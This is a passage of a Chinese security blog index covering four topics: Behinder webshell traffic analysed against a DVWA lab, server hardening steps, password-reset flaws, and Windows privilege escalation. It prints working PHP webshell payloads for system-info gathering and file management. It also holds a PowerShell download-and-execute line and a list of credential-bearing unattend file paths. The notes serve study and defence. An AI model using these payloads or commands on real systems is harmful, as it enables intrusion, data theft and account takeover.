Beta1中是很短一段字符串，而Beta6做了混淆}$content=&quot;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&quot;; main($content); 服务端相应 1 12//即响应客户端发送的content，如果返回了这个则说明连接成功了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 第二次交互 客户端发送 12345678910111213141516171819202122232425262728293031323334353637383940414243error_reporting(0);function main($whatever) { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =&quot;&quot;; if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;)) { for($i=65;$i&lt;=90;$i++) { $drive=chr($i).':/'; file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:''; } } else { $driveList=&quot;/&quot;; } $currentPath=getcwd(); //echo &quot;phpinfo=&quot;.$info.&quot;\\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\\n&quot;.&quot;driveList=&quot;.$driveList; $osInfo=PHP_OS; $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION['k']; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key); echo encrypt(json_encode($result), $key);}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }}$whatever=&quot;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&quot;;main($whatever); 这个过程就是得到 phpinfo、currentPath、driveList、osInfo（windows/winnt，否则 driveList 为空） 服务端响应 1234567............&quot;8L2JvZHk+PC9odG1sPg==&quot;,//此处省略一堆数据，重点在最后&quot;driveList&quot;:&quot;QzovOw==&quot;,&quot;currentPath&quot;:&quot;QzpccGhwc3R1ZHlfcHJvXFdXV1xEVldBXGhhY2thYmxlXHVwbG9hZHM=&quot;,&quot;osInfo&quot;:&quot;V0lOTlQ=&quot;}而这些解码后就是：C:/;C:\\phpstudy_pro\\WWW\\DVWA\\hackable\\uploadsWINNT 如果要看文件的话，则是以下流程 客户端发送 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198error_reporting(0);header('Content-Type: text/html; charset=UTF-8');function getSafeStr($str){ $s1 = iconv('utf-8','gbk//IGNORE',$str); $s0 = iconv('gbk','utf-8//IGNORE',$s1); if($s0 == $str){ return $s0; }else{ return iconv('gbk','utf-8//IGNORE',$str); }}function getgbkStr($str){ $s0 = iconv('gbk','utf-8//IGNORE',$s1); $s1 = iconv('utf-8','gbk//IGNORE',$str); if($s1 == $str){ return $s1; }else{ return iconv('utf-8','gbk//IGNORE',$str); }}function delDir($dir){ $files = array_diff(scandir($dir), array( '.', '..' )); foreach ($files as $file) { (is_dir(&quot;$dir/$file&quot;)) ? delTree(&quot;$dir/$file&quot;) : unlink(&quot;$dir/$file&quot;); } return rmdir($dir);}function main($mode, $path = &quot;.&quot;, $content = &quot;&quot;, $charset = &quot;&quot;,$newpath=&quot;&quot;){ //$path=getgbkStr($path); $path=getSafeStr($path); $result = array(); if ($path == &quot;.&quot;) $path = getcwd(); switch ($mode) { case &quot;list&quot;: $allFiles = scandir($path); $objArr = array(); foreach ($allFiles as $fileName) { $fullPath = $path . $fileName; if (!function_exists(&quot;mb_convert_encoding&quot;)) { $fileName=getSafeStr($fileName); } else { $fileName=mb_convert_encoding($fileName, 'UTF-8', mb_detect_encoding($fileName, &quot;UTF-8,GBK&quot;)); } $obj = array( &quot;name&quot; =&gt; base64_encode($fileName), &quot;size&quot; =&gt; base64_encode(filesize($fullPath)), &quot;lastModified&quot; =&gt; base64_encode(date(&quot;Y-m-d H:i:s&quot;, filemtime($fullPath))) ); $obj[&quot;perm&quot;] = is_readable($fullPath) . &quot;,&quot; . is_writable($fullPath) . &quot;,&quot; . is_executable($fullPath); if (is_file($fullPath)) { $obj[&quot;type&quot;] = base64_encode(&quot;file&quot;); } else { $obj[&quot;type&quot;] = base64_encode(&quot;directory&quot;); } array_push($objArr, $obj); } $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(json_encode($objArr)); echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;show&quot;: $contents = file_get_contents($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); if (function_exists(&quot;mb_convert_encoding&quot;)) { if ($charset==&quot;&quot;) { $charset = mb_detect_encoding($contents, array( 'GB2312', 'GBK', 'UTF-16', 'UCS-2', 'UTF-8', 'BIG5', 'ASCII' )); } $result[&quot;msg&quot;] = base64_encode(mb_convert_encoding($contents, &quot;UTF-8&quot;, $charset)); } else { if ($charset==&quot;&quot;) { $result[&quot;msg&quot;] = base64_encode(getSafeStr($contents)); } else { $result[&quot;msg&quot;] = base64_encode(iconv($charset, 'utf-8//IGNORE', $contents)); } } $result = encrypt(json_encode($result),$_SESSION['k']); echo $result; break; case &quot;download&quot;: if (! file_exists($path)) { header('HTTP/1.1 404 NOT FOUND'); } else { $file = fopen($path, &quot;rb&quot;); echo fread($file, filesize($path)); fclose($file); } break; case &quot;delete&quot;: if (is_file($path)) { if (unlink($path)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;删除成功&quot;); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;删除失败&quot;); } } if (is_dir($path)) { delDir($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path.&quot;删除成功&quot;); } echo encrypt(json_encode($result),$_SESSION['k']); break; case &quot;create&quot;: $file = fopen($path, &quot;w&quot;); $content = base64_decode($content); fwrite($file, $content); fflush($file); fclose($file); if (file_exists($path) &amp;&amp; filesize($path) == strlen($content)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;上传完成，远程文件大尿:&quot; . $path . filesize($path)); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;上传失败&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;createDirectory&quot;: if (file_exists($path)) { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;创建失败，目录已存在〿&quot;); } else { mkdir($path); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;目录创建成功〿&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; case &quot;append&quot;: $file = fopen($path, &quot;a+&quot;); $content = base64_decode($content); fwrite($file, $content); fclose($file); $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;追加完成，远程文件大尿:&quot; . $path . filesize($path)); echo encrypt(json_encode($result),$_SESSION['k']); break; case &quot;rename&quot;: if (rename($path,$newpath)) { $result[&quot;status&quot;] = base64_encode(&quot;success&quot;); $result[&quot;msg&quot;] = base64_encode(&quot;重命名完房:&quot; . $newpath); } else { $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;); $result[&quot;msg&quot;] = base64_encode($path . &quot;重命名失贿&quot;); } echo encrypt(json_encode($result), $_SESSION['k']); break; default: break; }}function encrypt($data,$key){ if(!extension_loaded('openssl')) { for($i=0;$i&lt;strlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1&amp;15]; } return $data; } else { return openssl_encrypt($data, &quot;AES128&quot;, $key); }}$mode=&quot;list&quot;;$path=&quot;C:/phpstudy_pro/WWW/DVWA/hackable/&quot;;main($mode,$path); 服务端响应 12345678[{&quot;name&quot;:&quot;Lg==&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0xNiAxOToxNjo0NA==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;Li4=&quot;,&quot;size&quot;:&quot;NDA5Ng==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;MS5waHA=&quot;,&quot;size&quot;:&quot;Mjc=&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0xNiAxOToxNjo0NA==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZmlsZQ==&quot;},{&quot;name&quot;:&quot;ZmxhZ3M=&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;dXBsb2Fkcw==&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAyMS0wMi0yMiAyMjoyMjozOQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;},{&quot;name&quot;:&quot;dXNlcnM=&quot;,&quot;size&quot;:&quot;MA==&quot;,&quot;lastModified&quot;:&quot;MjAxOS0wOS0yOSAxODo0NDoyNQ==&quot;,&quot;perm&quot;:&quot;1,1,&quot;,&quot;type&quot;:&quot;ZGlyZWN0b3J5&quot;}] Base64 解码即是读取的各种文件的属性，例如 Lg==就是 .，而 Li4==就是 ..","link":"/2020/08/11/%E5%86%B0%E8%9D%8E/"},{"title":"简述 Windows 及 Linux 平台服务的安全加固","text":"Web 安全加固防止 web 中.mdb 数据库文件非法下载管理工具-&gt;IIS 管理器-&gt;网站-&gt;Default Web Site-&gt;请求筛选-&gt;右键文件拓展名-&gt;拒绝文件拓展名，添加拓展名.mdb 限制目录执行权限,对 picture 和 upload 目录设置执行权限为无管理工具-&gt;IIS 管理器-&gt;网站-&gt;web-&gt;picture/upload-&gt;处理程序映射，右键空白处-&gt;编辑功能权限，取消勾选执行 开启 IIS 的日志审计记录(日志文件保存格式为 W3C,只记录日期、时间、客户端 IP 地址、用户名、方法)管理工具-&gt;IIS 管理器-&gt;网站-&gt;web-&gt;日志，格式选择 W3C，点击选择字段，只勾选日期、时间、客户端 IP 地址、用户名、方法 为了减轻网站负载，设置网站最大并发连接数为 1000管理工具-&gt;IIS 管理器-&gt;网站-&gt;，右侧-设置网站默认设置，设置限制连接数值为 1000 防止文件枚举漏洞枚举网络服务器根目录文件，禁止 IIS 短文件名泄露CMD 执行命令 1fsutil behavior set disable8dot3 1 关闭 IIS 的 WebDAV 功能增强网站的安全性管理工具-&gt;IIS 管理器-&gt;主机名(WIN-242GA01GJ9K)-&gt;ISAPI 和 CGI 限制,右键 WebDav,点击拒绝 服务加固与防火墙策略参考 服务加固与防火墙策略 主机加固Linux1.修改 ssh 的配置文件，禁止 root 直接登录 2.修改密码策略配置文件，确保密码最小长度为 8 位 3.确保错误登录 3 次，锁定此账户 5 分钟 4.禁止 su 非法[[提权]]，只允许 root 和 wheel 组用户 su 到 root 5.不响应 ICMP 请求 6.设置登陆超时时间为 10 分钟 结束非法登录用户 Windows 修改 3389 端口 设置安全策略，不允许 SAM 帐户的匿名枚举，不允许 SAM 帐户和共享的匿名枚举 在组策略中设置阻止访问注册表编辑工具 开启审核对象访问，成功与失败；开启审核目录服务访问，成功与失败；开启审核系统事件，成功与失败 禁止 445 端口漏洞 设置屏幕保护在恢复时使用密码保护 设置 windows 密码策略：使密码必须满足复杂性，设置密码长度最小值为 8 位，设置密码最长存留期为 30 天 开启 Windows 防火墙，关闭 ping 服务，打开 3389、80 等服务 关闭系统默认共享","link":"/2021/07/03/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"},{"title":"简述密码找回漏洞","text":"密码找回漏洞0x00.用户凭证暴力破解即发来的验证码可以通过爆破的方式进行破解（四位或六位纯数字） 0x01.返回凭证在忘记密码的某些地方发送数据，抓包找线索 url 返回验证码及 token 通过抓包等方式找到可疑的地方 密码找回凭证 网上申诉的密保问题可能会在数据包或者是页面源代码里边 并且可以通过只输入账号，或者手机号等单一信息来看服务器返回什么 0x02.邮箱弱 token因为重置密码的操作通常都是一个发到邮箱里的链接，那个链接的参数肯定有指定是哪一个用户以及一些 token所以： 可以尝试分析 token 的规律，来构造重置链接，（故不需要登上目标的邮箱） 邮箱里找回密码的 url 可能含有 auth，而生成 auth 用的是 rand()函数，windows 下 rand()最大值是 32768，如果我们队 32768 的每个数字取 md5，然后将 32768 个 md5 放置进 auth 去爆破，我们或许可以重置其他人的密码 0x03.越权推荐绑定 创建一个账号后，推荐绑定的地方，可以通过修改链接中的参数值来越权绑定其他账号 例如：创建一个账号，完成后弹出绑定手机号页面，填写自己的手机号，并修改链接中用户名的参数为目标的用户名，就可以将目标账号绑定到自己的手机上然后走正常通过手机找回密码的操作即可 创建一个自己的账号，点击找回密码，在自己的邮箱中看链接的形式，如果形式是用户名加弱 token 即上面的操作，但是如果是有其他绑定方式，如下： 1http://www.cpbao.com/user/fund!bindMobileOrEmail.action?userIdCard=用户ID&amp;isBindEmail=1&amp;bindEmail=邮箱 就可以使用把用户名改为他人的，而邮箱仍留位自己的。 0x04.服务器验证最终提交步骤 进行一个账号正常的重置密码操作，因为有可能发到邮箱里的链接不好分析，然后点进重置密码链接，在最后提交更改密码时抓包，将 uid 更改目标用户，即可重置目标用户的密码 可以抓取最后步骤的包，更改验证步骤的参数，例如：step = 4 来跳过验证步骤 0x05.本地验证 只要发出去的 request 和回来的 response 里验证码的数据是一样的，则验证成功。所以验证验证码的时候，先随便填写一个验证码，记住发出去的 request 里的验证码的具体参数，例如： 1https://account.oppo.com/index.php?q=user/confirmid&amp;type=1&amp;sign=e9fb209c9416fb0312980c47c4537f0b //即sign这里的参数 然后去拦截 response 包，包里从服务器返回的数据如下： 123456789101112131415HTTP/1.1 200 OKServer: nginxDate: Mon, 28 Jul 2014 04:15:39 GMTContent-Type: text/html;charset=utf-8Connection: keep-aliveVary: Accept-EncodingX-Powered-By: Zandy/1.0Expires: Mon, 26 Jul 1997 05:00:00 GMTLast-Modified: Mon, 28 Jul 2014 04:15:38 GMTCache-Control: no-store, no-cache, must-revalidateCache-Control: post-check=0, pre-check=0Pragma: no-cacheX-Server-ID: web106Content-Length: 56{&quot;flag&quot;:-4,&quot;msg&quot;:&quot;\\u9a8c\\u8bc1\\u7801\\u4e0d\\u6b63\\u786e&quot;} 只需要将内容修改为： 1{&quot;flag&quot;:1,&quot;msg&quot;:&quot;?q=user\\/resetPass&amp;username=&amp;type=1&amp;sign=e9fb209c9416fb0312980c47c4537f0b&quot;} 即可绕过本地验证 有可能一次验证或是别的操作会有多次的发包行为，如果有下一次是基于上一次返回的数据的，则可以更改第一次的 response 包来达到改变第二次 request 包的效果 0x06.[[sql注入]] 有可能在找回密码时，输入的用户名会与数据库进行交互，导致[[sql注入]]漏洞 0x07.注册覆盖 有种奇葩的注册覆盖模式，原理是输入用户名后系统会在输入框后立刻判断用户名是不是已经存在了，其原理是提交了一个有输入用户名的表单（包括下面的密码等）。所以可以利用最后填写用户名，先填写下面的密码等，最后填写用户名时写 admin，这时递交上去的表单就是包含新密码等一切数据的 admin 用户，后果就是会自动覆盖过去的 admin 用户的信息并已经登录成功了 0x08.session 覆盖 用不同账号在同一个浏览器进行两次账号发送给邮箱的重置密码链接的操作，然后在同一个浏览器里打开第二个链接，服务器会以为第二个链接的用户是第一个的，所以会间接重置第一个用户的密码","link":"/2019/11/11/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"},{"title":"简易提权知识点总结","text":"系统内核溢出漏洞手动执行发现缺失补丁 当获取到目标机器的 shell 以后，可以通过如下命令来看系统安装了哪些补丁，还具有哪些漏洞 1234whoami /groups //根据下面的Mandatory Label\\Medium Mandatory Level 来看自己是一个什么权限systeminfo //查看当前系统安装了哪些补丁wmic qfe get Caption,Description,HotFixID,InstalledOn //查看当前系统安装了哪些补丁 使用上传或者[[powershell]]的下载功能来将 exp 放到目标机里边 1powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('192.168.1.1');执行的代码。。。&quot; 通过联网查询得知并且利用 EXP 库 [[Metasploit]]中的 enum_patches [[Metasploit#post windows gather enum_patches]] Windows Exploit Suggester Powershell 的 Sherlock 脚本 Windows 系统配置错误直接获取系统安装的配置文件概述 网络管理员在给一堆机器安装同一环境时，会使用脚本调用固定的安装配置文件进行安装，有的时候回包含管理员账号密码等信息 常见敏感安装配置文件如下： 1234567891011C:\\sysprep.infC:\\sysprep\\sysprep.xmlC:\\Windows\\system32\\sysprep.infC:\\Windows\\system32\\sysprep\\sysprep.xmlC:\\unattend.xmlC:\\Windows\\Panther\\Unattend.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattend\\Unattend.xmlC:\\Windows\\System32\\Sysprep\\unattend.xmlC:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml 多种利用方式 直接使用 dir 相关命令搜索 1dir /b /s c:\\Unattend.xml [[Metasploit#post windows gather enum_unattend]] 系统服务权限配置错误概述 Windows 系统服务文件在系统启动时加载并执行，并在后台持续调用可执行文件。而如果一个低权限用户对此类文件具有写权限（即可以更改它），那么就会造成安全隐患。 